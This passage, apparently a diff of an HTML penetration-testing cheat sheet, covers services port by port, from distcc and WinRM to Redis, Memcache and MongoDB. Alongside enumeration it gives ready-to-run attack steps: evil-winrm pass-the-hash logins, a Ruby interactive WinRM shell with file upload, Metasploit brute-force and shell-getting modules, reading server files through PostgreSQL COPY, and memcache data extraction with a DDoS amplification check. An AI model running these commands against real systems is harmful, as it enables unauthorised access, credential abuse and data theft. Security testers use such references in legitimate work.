+runas /netonly /user&lt;DOMAIN&gt;<span style=color:#0ff;font-weight:700>\&lt;</span>NAME&gt; <span style=color:#0ff;font-weight:700>&#34;cmd.exe&#34;</span> ::The password will be prompted
+
+</code></pre></div><h3 id=port-3632---distcc>Port 3632 - distcc
+<a class=heading-link href=#port-3632---distcc><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Resources :</p><p>​* <a href=https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec>https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec</a>​</p><ul><li>​https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855​</li></ul><h3 id=port-4369---erlang-port-mapper-daemon-epmd>Port 4369 - Erlang Port Mapper Daemon (epmd)
+<a class=heading-link href=#port-4369---erlang-port-mapper-daemon-epmd><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+<span style=color:#fff;font-weight:700>echo</span> -n -e <span style=color:#0ff;font-weight:700>&#34;\x00\x01\x6e&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>4369</span>
+
+<span style=color:#007f7f># Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html</span>
+dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
+apt-get install erlang
+erl <span style=color:#007f7f># Once Erlang is installed this will promp an erlang terminal</span>
+1&gt; net_adm:names(<span style=color:#0ff;font-weight:700>&#39;&lt;HOST&gt;&#39;</span>). <span style=color:#007f7f># This will return the listen addresses</span>
+
+<span style=color:#007f7f># Automatic</span>
+nmap -sV -Pn -n -T4 -p <span style=color:#ff0;font-weight:700>4369</span> --script epmd-info $IP
+
+PORT     STATE SERVICE VERSION
+4369/tcp open  epmd    Erlang Port Mapper Daemon
+| epmd-info:
+|   epmd_port: <span style=color:#ff0;font-weight:700>4369</span>
+|   nodes:
+|     bigcouch: <span style=color:#ff0;font-weight:700>11502</span>
+|     freeswitch: <span style=color:#ff0;font-weight:700>8031</span>
+|     ecallmgr: <span style=color:#ff0;font-weight:700>11501</span>
+|     kazoo_apps: <span style=color:#ff0;font-weight:700>11500</span>
+|_    kazoo-rabbitmq: <span style=color:#ff0;font-weight:700>25672</span>
+
+</code></pre></div><h3 id=port-5353--udp---multicast-dns-mdns>Port 5353 / UDP - Multicast DNS (mDNS)
+<a class=heading-link href=#port-5353--udp---multicast-dns-mdns><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -Pn -sUC -p5353 192.168.1.2
+
+Starting Nmap 6.46 (http://nmap.org) at 2015-01-01 10:30 GMT
+Nmap scan report <span style=color:#fff;font-weight:700>for</span> 192.168.1.2
+PORT     STATE SERVICE
+5353/udp open  zeroconf
+
+</code></pre></div><h3 id=port-5432--5433----postgresql>Port 5432 / 5433 - Postgresql
+<a class=heading-link href=#port-5432--5433----postgresql><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Connect</span>
+psql -U &lt;myuser&gt; <span style=color:#007f7f># Open psql console with user</span>
+
+<span style=color:#007f7f># Remote connection</span>
+psql -h $IP -U &lt;username&gt; -d &lt;database&gt;
+psql -h $IP -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt;
+
+psql -h localhost -d &lt;database_name&gt; -U &lt;User&gt; <span style=color:#007f7f>#Password will be prompted</span>
+<span style=color:#0ff;font-weight:700>\l</span>ist <span style=color:#007f7f># List databases</span>
+<span style=color:#0ff;font-weight:700>\c</span> &lt;database&gt; <span style=color:#007f7f># use the database</span>
+<span style=color:#0ff;font-weight:700>\d</span> <span style=color:#007f7f># List tables</span>
+<span style=color:#007f7f>#To read a file:</span>
+CREATE TABLE demo(t text);
+COPY demo from <span style=color:#0ff;font-weight:700>&#39;[FILENAME]&#39;</span>;
+SELECT * FROM demo;
+
+<span style=color:#007f7f># Enumeration</span>
+msf&gt; use auxiliary/scanner/postgres/postgres_version
+msf&gt; use auxiliary/scanner/postgres/postgres_dbname_flag_injection
+
+</code></pre></div><h3 id=port-5671---amqp>Port 5671 - AMQP
+<a class=heading-link href=#port-5671---amqp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#fff;font-weight:700>import</span> amqp
+<span style=color:#007f7f>#By default it uses default credentials &#34;guest&#34;:&#34;guest&#34;</span>
+conn = amqp.connection.Connection(host=<span style=color:#0ff;font-weight:700>&#34;&lt;IP&gt;&#34;</span>, port=<span style=color:#ff0;font-weight:700>5672</span>, virtual_host=<span style=color:#0ff;font-weight:700>&#34;/&#34;</span>)
+conn.connect()
+<span style=color:#fff;font-weight:700>for</span> k, v in conn.server_properties.items():
+    <span style=color:#fff;font-weight:700>print</span>(k, v)
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Automatic</span>
+nmap -sV -Pn -n -T4 -p <span style=color:#ff0;font-weight:700>5672</span> --script amqp-info $IP
+</code></pre></div><h3 id=port-5985--5986---winrm>Port 5985 / 5986 - WinRM
+<a class=heading-link href=#port-5985--5986---winrm><i class="fa fa-link" aria-hidden=true></i></a></h3><p>5985/tcp (HTTP)
+5986/tcp (HTTPS)</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gem install evil-winrm
+evil-winrm -i $IP -u Administrator -p <span style=color:#0ff;font-weight:700>&#39;password1&#39;</span>
+<span style=color:#007f7f># Pass the hash with evil-winrm</span>
+evil-winrm -i $IP -u Administrator -H <span style=color:#0ff;font-weight:700>&#39;hash-pass&#39;</span>
+
+</code></pre></div><p>Code extracted from here: <a href=https://alamot.github.io/winrm_shell/>https://alamot.github.io/winrm_shell/</a></p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=color:#fff;font-weight:700>require</span> <span style=color:#0ff;font-weight:700>&#39;winrm-fs&#39;</span>
+
+<span style=color:#007f7f># Author: Alamot</span>
+<span style=color:#007f7f># To upload a file type: UPLOAD local_path remote_path</span>
+<span style=color:#007f7f># e.g.: PS&gt; UPLOAD myfile.txt C:\temp\myfile.txt</span>
+
+
+conn = WinRM::Connection.new(
+  <span style=color:#0ff;font-weight:700>endpoint</span>: <span style=color:#0ff;font-weight:700>&#39;https://IP:PORT/wsman&#39;</span>,
+  <span style=color:#0ff;font-weight:700>transport</span>: <span style=color:#0ff;font-weight:700>:ssl</span>,
+  <span style=color:#0ff;font-weight:700>user</span>: <span style=color:#0ff;font-weight:700>&#39;username&#39;</span>,
+  <span style=color:#0ff;font-weight:700>password</span>: <span style=color:#0ff;font-weight:700>&#39;password&#39;</span>,
+  <span style=color:#0ff;font-weight:700>:no_ssl_peer_verification</span> =&gt; <span style=color:#fff;font-weight:700>true</span>
+)
+
+
+<span style=color:#fff;font-weight:700>class</span> String
+  <span style=color:#fff;font-weight:700>def</span> tokenize
+    <span style=color:#fff;font-weight:700>self</span>.
+      <span style=color:#fff;font-weight:700>split</span>(<span style=color:#0ff;font-weight:700>/\s(?=(?:[^&#39;&#34;]|&#39;[^&#39;]*&#39;|&#34;[^&#34;]*&#34;)*$)/</span>).
+      <span style=color:#fff;font-weight:700>select</span> {|s| not s.empty? }.
+      map {|s| s.gsub(<span style=color:#0ff;font-weight:700>/(^ +)|( +$)|(^[&#34;&#39;]+)|([&#34;&#39;]+$)/</span>,<span style=color:#0ff;font-weight:700>&#39;&#39;</span>)}
+  <span style=color:#fff;font-weight:700>end</span>
+<span style=color:#fff;font-weight:700>end</span>
+
+
+command=<span style=color:#0ff;font-weight:700>&#34;&#34;</span>
+file_manager = WinRM::FS::FileManager.new(conn)
+
+
+conn.shell(<span style=color:#0ff;font-weight:700>:powershell</span>) <span style=color:#fff;font-weight:700>do</span> |shell|
+    <span style=color:#fff;font-weight:700>until</span> command == <span style=color:#0ff;font-weight:700>&#34;exit</span><span style=color:#0ff;font-weight:700>\n</span><span style=color:#0ff;font-weight:700>&#34;</span> <span style=color:#fff;font-weight:700>do</span>
+        output = shell.run(<span style=color:#0ff;font-weight:700>&#34;-join($id,&#39;PS &#39;,$(whoami),&#39;@&#39;,$env:computername,&#39; &#39;,$((gi $pwd).Name),&#39;&gt; &#39;)&#34;</span>)
+        <span style=color:#fff;font-weight:700>print</span>(output.output.chomp)
+        command = <span style=color:#fff;font-weight:700>gets</span>
+        <span style=color:#fff;font-weight:700>if</span> command.start_with?(<span style=color:#0ff;font-weight:700>&#39;UPLOAD&#39;</span>) <span style=color:#fff;font-weight:700>then</span>
+            upload_command = command.tokenize
+            <span style=color:#fff;font-weight:700>print</span>(<span style=color:#0ff;font-weight:700>&#34;Uploading &#34;</span> + upload_command[<span style=color:#ff0;font-weight:700>1</span>] + <span style=color:#0ff;font-weight:700>&#34; to &#34;</span> + upload_command[<span style=color:#ff0;font-weight:700>2</span>])
+            file_manager.upload(upload_command[<span style=color:#ff0;font-weight:700>1</span>], upload_command[<span style=color:#ff0;font-weight:700>2</span>]) <span style=color:#fff;font-weight:700>do</span> |bytes_copied, total_bytes, local_path, remote_path|
+                <span style=color:#fff;font-weight:700>puts</span>(<span style=color:#0ff;font-weight:700>&#34;</span><span style=color:#0ff;font-weight:700>#{</span>bytes_copied<span style=color:#0ff;font-weight:700>}</span><span style=color:#0ff;font-weight:700> bytes of </span><span style=color:#0ff;font-weight:700>#{</span>total_bytes<span style=color:#0ff;font-weight:700>}</span><span style=color:#0ff;font-weight:700> bytes copied&#34;</span>)
+            <span style=color:#fff;font-weight:700>end</span>
+            command = <span style=color:#0ff;font-weight:700>&#34;echo `nOK`n&#34;</span>
+        <span style=color:#fff;font-weight:700>end</span>
+        output = shell.run(command) <span style=color:#fff;font-weight:700>do</span> |stdout, stderr|
+            STDOUT.print(stdout)
+            STDERR.print(stderr)
+        <span style=color:#fff;font-weight:700>end</span>
+    <span style=color:#fff;font-weight:700>end</span>
+    <span style=color:#fff;font-weight:700>puts</span>(<span style=color:#0ff;font-weight:700>&#34;Exiting with code </span><span style=color:#0ff;font-weight:700>#{</span>output.exitcode<span style=color:#0ff;font-weight:700>}</span><span style=color:#0ff;font-weight:700>&#34;</span>)
+<span style=color:#fff;font-weight:700>end</span>
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>#Msf
+msf &gt; use auxiliary/scanner/winrm/winrm_login
+    #Bruteforce
+msf &gt; use auxiliary/scanner/winrm/winrm_login
+    #Running Commands
+msf &gt; use auxiliary/scanner/winrm/winrm_cmd
+    #Getting Shells!
+msf &gt; use exploit/windows/winrm/winrm_script_exec
+
+</code></pre></div><h3 id=vnc---5800--5801--5900--5901----vnc>VNC - 5800 / 5801 / 5900 / 5901 - VNC
+<a class=heading-link href=#vnc---5800--5801--5900--5901----vnc><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p &lt;PORT&gt; $IP
+msf&gt; use auxiliary/scanner/vnc/vnc_none_auth
+
+<span style=color:#007f7f># Connect to vnc using Kali</span>
+vncviewer [-passwd passwd.txt] $IP::5901
+
+</code></pre></div><h3 id=port-5984---couchdb>Port 5984 - CouchDB
+<a class=heading-link href=#port-5984---couchdb><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV --script couchdb-databases,couchdb-stats -p <span style=color:#ff0;font-weight:700>5984</span> $IP
+msf&gt; use auxiliary/scanner/couchdb/couchdb_enum
+
+curl http://IP:5984/
+<span style=color:#007f7f># The reply should look something like:</span>
+{<span style=color:#0ff;font-weight:700>&#34;couchdb&#34;</span>:<span style=color:#0ff;font-weight:700>&#34;Welcome&#34;</span>,<span style=color:#0ff;font-weight:700>&#34;version&#34;</span>:<span style=color:#0ff;font-weight:700>&#34;0.10.1&#34;</span>}
+
+</code></pre></div><p>References :</p><ul><li><a href=https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html>https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html</a>​</li></ul><h3 id=port-6000---x11>Port 6000 - X11
+<a class=heading-link href=#port-6000---x11><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># enumeration</span>
+nmap -sV --script x11-access -p <span style=color:#ff0;font-weight:700>6000</span> $IP
+msf&gt; use auxiliary/scanner/x11/open_x11
+
+<span style=color:#007f7f># Remote Desktop View Way from:</span>
+https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref
+
+<span style=color:#007f7f># Get Shell</span>
+msf&gt; use exploit/unix/x11/x11_keyboard_exec
+
+</code></pre></div><h3 id=redis---6379>Redis - 6379
+<a class=heading-link href=#redis---6379><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap --script redis-info -sV -p <span style=color:#ff0;font-weight:700>6379</span> $IP
+msf&gt; use auxiliary/scanner/redis/redis_server
+
+https://github.com/Avinash-acid/Redis-Server-Exploit
+python redis.py 10.10.10.160 redis
+
+<span style=color:#007f7f># redis-tools</span>
+sudo apt-get install redis-tools
+redis-cli -h 192.168.0.24
+192.168.0.24:6379&gt; info
+192.168.0.24:6379&gt; CONFIG GET *
+192.168.0.24:6379&gt; keys *
+192.168.0.24:6379&gt; get 351115ba5f690fb9b1bdc1b41e673a94 <span style=color:#007f7f>#This is a key list on the last command</span>
+
+<span style=color:#007f7f># auto exploit</span>
+redis-cli -h 192.168.0.24
+192.168.0.24:6379&gt; info
+192.168.0.24:6379&gt; CONFIG GET *
+192.168.0.24:6379&gt; keys *
+192.168.0.24:6379&gt; get 351115ba5f690fb9b1bdc1b41e673a94 <span style=color:#007f7f>#This is a key list on the last command</span>
+
+</code></pre></div><h3 id=port-8009---apache-jserv-protocol-ajp>Port 8009 - Apache JServ Protocol (AJP)
+<a class=heading-link href=#port-8009---apache-jserv-protocol-ajp><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Basic Information :
+From: <a href=https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/>https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/</a></p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p <span style=color:#ff0;font-weight:700>8009</span> $IP
+
+</code></pre></div><h3 id=msdeploy---8172>MsDeploy - 8172
+<a class=heading-link href=#msdeploy---8172><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Microsoft IIS Deploy port</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$IP:8172/msdeploy.axd
+</code></pre></div><h3 id=webdav>Webdav
+<a class=heading-link href=#webdav><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>davtest -cleanup -url http://$IP
+cadaver http://$IP
+</code></pre></div><h3 id=port-9042--9160----cassandra>Port 9042 / 9160 - Cassandra
+<a class=heading-link href=#port-9042--9160----cassandra><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#Enumeration</span>
+pip install cqlsh
+cqlsh $IP
+<span style=color:#007f7f>#Basic info enumeration</span>
+SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
+<span style=color:#007f7f>#Keyspace enumeration</span>
+SELECT keyspace_name FROM system.schema_keyspaces;
+desc &lt;Keyspace_name&gt;    <span style=color:#007f7f>#Decribe that DB</span>
+desc system_auth        <span style=color:#007f7f>#Describe the DB called system_auth</span>
+SELECT * from system_auth.roles;  <span style=color:#007f7f>#Retreive that info, can contain credential hashes</span>
+SELECT * from logdb.user_auth;    <span style=color:#007f7f>#Can contain credential hashes</span>
+SELECT * from logdb.user;
+SELECT * from configuration.<span style=color:#0ff;font-weight:700>&#34;config&#34;</span>;
+<span style=color:#007f7f># auto</span>
+nmap -sV --script cassandra-info -p 9042,9160 $IP
+
+</code></pre></div><h3 id=port-9100---raw-printing-jetdirect-appsocket-pdl-datastream>Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream)
+<a class=heading-link href=#port-9100---raw-printing-jetdirect-appsocket-pdl-datastream><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -sV --script pjl-ready-message -p &lt;PORT&gt; $IP
+msf&gt; use auxiliary/scanner/printer/printer_env_vars
+msf&gt; use auxiliary/scanner/printer/printer_list_dir
+msf&gt; use auxiliary/scanner/printer/printer_list_volumes
+msf&gt; use auxiliary/scanner/printer/printer_ready_message
+msf&gt; use auxiliary/scanner/printer/printer_version_info
+msf&gt; use auxiliary/scanner/printer/printer_download_file
+msf&gt; use auxiliary/scanner/printer/printer_upload_file
+msf&gt; use auxiliary/scanner/printer/printer_delete_file
+</code></pre></div><p><a href=https://github.com/RUB-NDS/PRET>Printers Hacking tool</a></p><h3 id=port-9200---elasticsearch>Port 9200 - Elasticsearch
+<a class=heading-link href=#port-9200---elasticsearch><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Read this <a href=https://www.elastic.co/what-is/elasticsearch>https://www.elastic.co/what-is/elasticsearch</a></p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+firefox http://$IP:9200/
+</code></pre></div><p>You can gather all the indices accessing <code>http://10.10.10.115:9200/_cat/indices?v</code></p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
+green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   <span style=color:#ff0;font-weight:700>1</span>   <span style=color:#ff0;font-weight:700>0</span>          <span style=color:#ff0;font-weight:700>1</span>            <span style=color:#ff0;font-weight:700>0</span>        4kb            4kb
+yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   <span style=color:#ff0;font-weight:700>5</span>   <span style=color:#ff0;font-weight:700>1</span>        <span style=color:#ff0;font-weight:700>253</span>            <span style=color:#ff0;font-weight:700>0</span>    262.7kb        262.7kb
+yellow open   bank    eSVpNfCfREyYoVigNWcrMw   <span style=color:#ff0;font-weight:700>5</span>   <span style=color:#ff0;font-weight:700>1</span>       <span style=color:#ff0;font-weight:700>1000</span>            <span style=color:#ff0;font-weight:700>0</span>    483.2kb        483.2kb
+
+</code></pre></div><p>&mldr; in build</p><h3 id=port--10000---network-data-management-protocol-ndmp>Port 10000 - Network Data Management Protocol (ndmp)
+<a class=heading-link href=#port--10000---network-data-management-protocol-ndmp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -n -sV --script <span style=color:#0ff;font-weight:700>&#34;ndmp-fs-info or ndmp-version&#34;</span> -p <span style=color:#ff0;font-weight:700>10000</span> $IP
+
+</code></pre></div><h3 id=port-11211---memcache>Port 11211 - Memcache
+<a class=heading-link href=#port-11211---memcache><i class="fa fa-link" aria-hidden=true></i></a></h3><p>To ex-filtrate all the information saved inside a memcache instance you need to:
+1 ) Find slabs with active items
+2 ) Get the key names of the slabs detected before
+3 ) Ex-filtrate the saved data by getting the key names</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;version&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>11211</span>      <span style=color:#007f7f>#Get version</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;stats&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>11211</span>        <span style=color:#007f7f>#Get status</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;stats slabs&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>11211</span>  <span style=color:#007f7f>#Get slabs</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;stats items&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>11211</span>  <span style=color:#007f7f>#Get items of slabs with info</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;stats cachedump &lt;number&gt; 0&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>11211</span>  <span style=color:#007f7f>#Get key names</span>
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;get &lt;item_name&gt;&#34;</span> | nc -vn $IP <span style=color:#ff0;font-weight:700>11211</span>  <span style=color:#007f7f>#Get saved info</span>
+
+<span style=color:#007f7f>#This php will just dumo the keys, you need to use &#34;get &lt;item_name&gt; later&#34;</span>
+sudo apt-get install php-memcached
+php -r <span style=color:#0ff;font-weight:700>&#39;$c = new Memcached(); $c-&gt;addServer(&#34;localhost&#34;, 11211); var_dump( $c-&gt;getAllKeys() );&#39;</span>
+
+<span style=color:#007f7f># auto mode ;)</span>
+nmap -n -sV --script memcached-info -p <span style=color:#ff0;font-weight:700>11211</span> $IP   <span style=color:#007f7f>#Just gather info</span>
+msf &gt; use auxiliary/gather/memcached_extractor      <span style=color:#007f7f>#Extracts saved data</span>
+msf &gt; use auxiliary/scanner/memcached/memcached_amp <span style=color:#007f7f>#Check is UDP DDoS amplification attack is possible</span>
+
+</code></pre></div><h3 id=port-15672---rabbitmq-management>Port 15672 - RabbitMQ Management
+<a class=heading-link href=#port-15672---rabbitmq-management><i class="fa fa-link" aria-hidden=true></i></a></h3><p><a href=https://www.rabbitmq.com/management.html>management plugin</a></p><p>The default credentials are &ldquo;guest&rdquo;:&ldquo;guest&rdquo;</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+rabbitmq-plugins <span style=color:#fff;font-weight:700>enable</span> rabbitmq_management
+service rabbitmq-server restart
+
+</code></pre></div><h3 id=port-27017--27018---mongodb>Port 27017 / 27018 - MongoDB
+<a class=heading-link href=#port-27017--27018---mongodb><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#fff;font-weight:700>from</span> pymongo <span style=color:#fff;font-weight:700>import</span> MongoClient
+client = MongoClient(host, port, username=username, password=password)
+client.server_info() <span style=color:#007f7f>#Basic info</span>
+<span style=color:#007f7f>#If you have admin access you can obtain more info</span>
+admin = client.admin
+admin_info = admin.command(<span style=color:#0ff;font-weight:700>&#34;serverStatus&#34;</span>)
+cursor = client.list_databases()
+<span style=color:#fff;font-weight:700>for</span> db in cursor:
+    <span style=color:#fff;font-weight:700>print</span>(db)
+    <span style=color:#fff;font-weight:700>print</span>(client[db[<span style=color:#0ff;font-weight:700>&#34;name&#34;</span>]].list_collection_names())
+<span style=color:#007f7f>#If admin access, you could dump the database also</span>
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Some MongoDB commnads:</span>
+show dbs
+use &lt;db&gt;
+show collections
+db.&lt;collection&gt;.find()  <span style=color:#007f7f>#Dump the collection</span>
+db.&lt;collection&gt;.count() <span style=color:#007f7f>#Number of records of the collection</span>
+db.current.find({<span style=color:#0ff;font-weight:700>&#34;username&#34;</span>:<span style=color:#0ff;font-weight:700>&#34;admin&#34;</span>})  <span style=color:#007f7f>#Find in current db the username admin</span>
+
+<span style=color:#007f7f># Automatic</span>
+nmap -sV --script <span style=color:#0ff;font-weight:700>&#34;mongo* and default&#34;</span> -p <span style=color:#ff0;font-weight:700>27017</span> $IP
+
+<span style=color:#007f7f># Login</span>
+mongo $IP
+mongo $IP:&lt;PORT&gt;
+mongo $IP:&lt;PORT&gt;/&lt;DB&gt;
+mongo &lt;database&gt; -u &lt;username&gt; -p <span style=color:#0ff;font-weight:700>&#39;&lt;password&gt;&#39;</span>
+
+nmap -n -sV --script mongodb-brute -p <span style=color:#ff0;font-weight:700>27017</span> $IP
+
+<span style=color:#007f7f># Look inside /opt/bitnami/mongodb/mongodb.conf to know if credentials are needed:</span>
+grep <span style=color:#0ff;font-weight:700>&#34;noauth.*true&#34;</span> /opt/bitnami/mongodb/mongodb.conf | grep -v <span style=color:#0ff;font-weight:700>&#34;^#&#34;</span> <span style=color:#007f7f>#Not needed</span>
+grep <span style=color:#0ff;font-weight:700>&#34;auth.*true&#34;</span> /opt/bitnami/mongodb/mongodb.conf | grep -v <span style=color:#0ff;font-weight:700>&#34;^#\|noauth&#34;</span> <span style=color:#007f7f>#Not needed</span>
+
+</code></pre></div><h3 id=port-44818--udp--tcp---ethernetip>Port 44818 / UDP / TCP - EthernetIP
+<a class=heading-link href=#port-44818--udp--tcp---ethernetip><i class="fa fa-link" aria-hidden=true></i></a></h3><p>en.wikipedia.org/wiki/EtherNet/IP</p><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+nmap -n -sV --script enip-info -p <span style=color:#ff0;font-weight:700>44818</span> $IP
+pip3 install cpppo
+python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a $IP
+</code></pre></div><h3 id=port-47808--udp---bacnet>Port 47808 / udp - BACNet
+<a class=heading-link href=#port-47808--udp---bacnet><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Enumeration</span>
+pip3 install BAC0
+import BAC0
+bbmdIP = <span style=color:#0ff;font-weight:700>&#39;$IP:47808&#39;</span>
+bbmdTTL = <span style=color:#ff0;font-weight:700>900</span>
+bacnet = BAC0.connect(bbmdAddress=bbmdIP, bbmdTTL=bbmdTTL) <span style=color:#007f7f>#Connect</span>
+bacnet.vendorName.strValue
+
+<span style=color:#007f7f># Or just use nmap</span>
+nmap --script bacnet-info --script-args full=yes -sU -n -sV -p <span style=color:#ff0;font-weight:700>47808</span> $IP
+
+</code></pre></div><h3 id=port-50030--50060--50070--50075--50090---hadoop>Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop
+<a class=heading-link href=#port-50030--50060--50070--50075--50090---hadoop><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Basic Information</p><p>Apache Hadoop is an open source framework supporting the distributed storage and processing of large datasets using computer clusters.
+Storage is handled by the Hadoop Distributed File System (HDFS) and processing is performed by using MapReduce and other applications (e.g., Apache Storm, Flink, and Spark) via YARN.</p><h3 id=unknown-ports>Unknown ports
+<a class=heading-link href=#unknown-ports><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>amap -d $IP <span style=color:#ff0;font-weight:700>8000</span>
+
+<span style=color:#007f7f># netcat: makes connections to ports. Can echo strings or give shells:</span>
+
+nc -nv $IP <span style=color:#ff0;font-weight:700>110</span>
+
